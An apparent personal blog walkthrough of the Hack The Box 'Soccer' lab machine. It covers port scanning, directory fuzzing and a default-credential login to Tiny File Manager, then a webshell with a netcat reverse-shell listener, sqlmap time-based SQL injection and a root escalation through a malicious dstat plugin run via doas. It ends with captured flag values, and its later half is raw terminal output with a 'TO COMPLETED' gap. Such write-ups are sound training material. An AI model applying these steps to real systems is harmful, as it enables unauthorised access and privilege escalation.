---
title: "HTB - Soccer walkthrough"

author: Luigi Vezzoso
layout: post
tags: 
    - walkthrough
    - hackthebox
    - pentest
category: posts
---

Hi There!

This is my first walkthrough of [Hack The Box](https://app.hackthebox.com/) machine **SOCCER**. My goal is to track the methodology, the mindset and in the process in general used to reach the goal.

![soccer-img](assets/postimages/soccer/Soccer.png)

## initial footprint
Usually for HTB machine we should adopt a black-box pentest methodology..... no information are provided from the platform except the name of the machine....that sometime give some initial hints about what we will find during the journey to **root**.

Usually I like to perform three types of scan:
- quick scan over the most common TCP port to have an initial idea of the target
- full TCP and UDP scan with service discovery

### Quick Scan

To obtain some information very quickly I start with basic port scan (by default namp will scan the top 1000 most used port)

**nmap -sV 10.10.11.194 -oG soccer.quick.nmap**

After the initial scan I proceed with full scan:

**nmap -sV 10.10.11.194 -p- -oS soccer.full.nmap**

{% highlight shell %}

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ nmap -sV 10.10.11.194 -oG soccer.quick.nmap 

Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-09 23:01 CET
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.071s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port9091-TCP:V=7.80%I=7%D=1/9%Time=63BC8EA4%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Mon,\x2009\x20Jan\x202023\x2022:01:13\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Mon,\x2009\x20Jan\x202023\x2022:01:14\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Mon,\x
SF:2009\x20Jan\x202023\x2022:01:14\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ 

{% endhighlight %}

Initial scan alreay provide some infomation in very few second (20sec!!!) full scan didn't give [more information]() as the machine just have ports 22, 80, 9091 opened. 

## service enumeration

Looking at the service exposed by the machine, two services capture our attention: port 80 and 9091. 

### 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
We leave port 22 as last chance as usually it not provide much attack surface:
- encrypted traffic
- auth required
- very common and test service 

### 80/tcp open http nginx 1.18.0 (Ubuntu) 
HTTP service with its website/web-application could expose more attack surface so is a good target to focus on. When we try to access a HTTP server we should take in consideration, the possibility of having multiple VHOST on the same server. 

If we were in real pentest scenario, we could (or should) try to understand/discover the FQDN of the server using DNS, ARP, OSINT tool, etc.

In the case of HTB, usually the machines have a FQDNs similar to the name in the htb domain: in this case we have **soccer.htb**. Be careful... this is just a rul of thumb and more discovery is normally neede. Just in as indication:
- check *subject alternative names* (SAN) in the certificate (if the service is in TLS)
- check *hosts file* in the server as soon we have access on it
- check the reverse proxy and/or webserver/application-server *VHOST* configuration

After having inserted the FQDN into attacker machine *hosts file* we can start the service enumeration. But first of all usually I check using standard browser if I can access the website, if I can recognize of-the-shelf product, etc.

![soccer-web](assets/postimages/soccer/soccer-webpage-01.png)

To perform enumeration on port 80 where an HTTP server is listening (more correctly a reverse proxy is listening) we could use several tool. At the moment my preferred one is [Gobuster](https://github.com/OJ/gobuster) for its very good performances, good visualization capabilities, and becouse GOlang is cool! :)

Web page/file fuzzer tool are usually based on wordlists. Discovery process could be very tedius and....... TO COMPLETED!!!!

{% highlight shell %}

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ gobuster -u soccer.htb -w /home/xabaras/hacking-tool/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://soccer.htb/
[+] Threads      : 10
[+] Wordlist     : /home/xabaras/hacking-tool/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/01/10 00:09:28 Starting gobuster
=====================================================
/tiny (Status: 301)
Progress: 49676 / 220561 (22.52%)

{% endhighlight %}


Fuzzer founded a web page **/tiny** who respond an [HTTP 301 message](https://en.wikipedia.org/wiki/HTTP_301) who indicare a redirect to different page (i.e. to an authentication page). Let's check with the browser and we will be in front to **Tiny File Manager** login page!

![soccer-tiny-file-manager](assets/postimages/soccer/soccer-tiny-file-manager.png)

Searching on Internet some info about [tiny file manager](https://tinyfilemanager.github.io/), we could see that is an opensource project, hosted in GitHub. Like most of opensource projects, all the documentation is available and we can go deeper in the usage, the configurations, etc.

In this case, we are in front of login page, so next step is to find a way to access it. 
- check default credentiala
- bruteforce
- looking/searching for authentication bug/vulnerability
- steal some credential (in real scenario)

Let's try the first and more simple attack path.... searching in Tiny File Manager documentaion we can easely find this information.

![tiny-docs](assets/postimages/soccer/tiny-fm-docs.png)

 
*admin/admin@123*
*user/12345*

Let's try to use admin credential..... 

![tiny-accessed](assets/postimages/soccer/tiny-accessed.png)

BOOM!!!

we can uload a webshekk

xabaras@helix:~/workdir/ctf/htb/soccer.htb$ nc -nvlp 8000
Listening on 0.0.0.0 8000

Connection received on 10.10.11.194 46782
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 22:38:28 up  2:09,  2 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ 



$ cat /etc/hosts
127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb

127.0.1.1	ubuntu-focal	ubuntu-focal

$ 







abaras@helix:~/workdir/ctf/htb/soccer.htb$ sqlmap -u ws://soc-player.soccer.htb:9091/ --data '{"id":"64286*"}'
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:50:47 /2023-02-17/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] y
[23:50:54] [INFO] resuming back-end DBMS 'mysql' 
[23:50:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"72525 AND (SELECT 7135 FROM (SELECT(SLEEP(5)))nZtU)-- nwsQ"}
---
[23:50:57] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[23:50:57] [INFO] fetched data logged to text files under '/home/xabaras/.sqlmap/output/soc-player.soccer.htb'
[23:50:57] [WARNING] your sqlmap version is outdated

[*] ending @ 23:50:57 /2023-02-17/





xabaras@helix:~/workdir/ctf/htb/soccer.htb$ ssh player@soccer.htb
player@soccer.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 17 22:54:28 UTC 2023

  System load:           0.0
  Usage of /:            71.1% of 3.84GB
  Memory usage:          27%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:feb9:eee3


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb 17 21:52:56 2023 from 10.10.14.174
player@soccer:~$ 



player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)
player@soccer:~$ cat /home/player/
.bash_history     .bashrc           .gnupg/           .profile          dstat_socccer.py  snap/             
.bash_logout      .cache/           .local/           .viminfo          dstat_soccer.py   user.txt          
player@soccer:~$ cat /home/player/user.txt 
a53fee5310e0cd175fac900277aef1c6
player@soccer:~$ 





find: ‘/snap/core20/1695/var/lib/snapd/void’: Permission denied
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
player@soccer:~$ 



player@soccer:~$ find / -name doas.conf 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:~$ 



player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat


https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/


player@soccer:~$ vi /usr/local/share/dstat/xabaras.py



import os
os.setuid(0)
os.system("/bin/bash")
~                                                                                                                                                                                                            
     



player@soccer:~$ /usr/local/bin/doas -u root /usr/bin/dstat --xabaras
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/home/player# if
> ^C
root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)
root@soccer:/home/player# cat /root/root.txt 
b35fe80d70d15e0f4334b1ddb8d7060e
root@soccer:/home/player# 









